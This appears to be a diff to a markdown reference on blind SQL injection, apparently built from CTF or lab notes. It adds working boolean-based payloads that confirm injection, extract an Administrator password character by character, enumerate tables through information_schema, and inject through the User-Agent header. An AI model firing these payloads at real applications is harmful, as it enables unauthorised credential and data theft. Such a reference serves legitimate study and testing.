@@ -3,9 +3,10 @@
 Full detail behind SKILL.md section 3. Use these when the app returns no query output. From notes 03, 04, 06, 18, 21, 24.
 
 ## Boolean-based blind
-The app shows a detectable difference (a "Welcome back" flag, a non-empty field, a 200 vs empty) depending on a condition.
-- Confirm: `' AND 1=1-- -` (true -> normal) vs `' AND 1=2-- -` (false -> different). Real case: a `NameEntity` field that is populated vs empty (note 22); a signup "taken/available" flag.
-- Extract one char at a time with binary search: `' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) > 'm'-- -`, narrow the range, then `= 's'`. (`SUBSTR` on Oracle.)
+The app shows a detectable difference (a "Welcome back" flag, a non-empty field, a 200 vs empty, a signup "taken/available" flag, differing HTTP status) depending on a condition. Any binary response tied to DB content is an oracle (note 23).
+- Confirm: `' AND 1=1-- -` (true -> normal) vs `' AND 1=2-- -` (false -> different). Real cases: a `NameEntity` field populated vs empty (note 22); a `{"taken":true/false}` username checker (note 23).
+- Extract one char at a time with binary search: `' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) > 'm'-- -`, narrow, then `= 's'`. (`SUBSTR` on Oracle.) ASCII form: `... (SELECT ASCII(SUBSTRING(password,1,1)) ...) > 97` and binary-search the ASCII value (note 23).
+- Full enumeration (note 23): count via `(SELECT COUNT(*) FROM information_schema.schemata)=N`; map tables/columns with `information_schema.tables/columns ... LIKE 'u%'` drilled to the name; find `LENGTH(col)=N` before extracting each char. Try predictable names (`username`, `password`, `email`) first to save requests.
 - Header context works the same: append the boolean to a `User-Agent` (note 18).
 
 ## Time-based blind
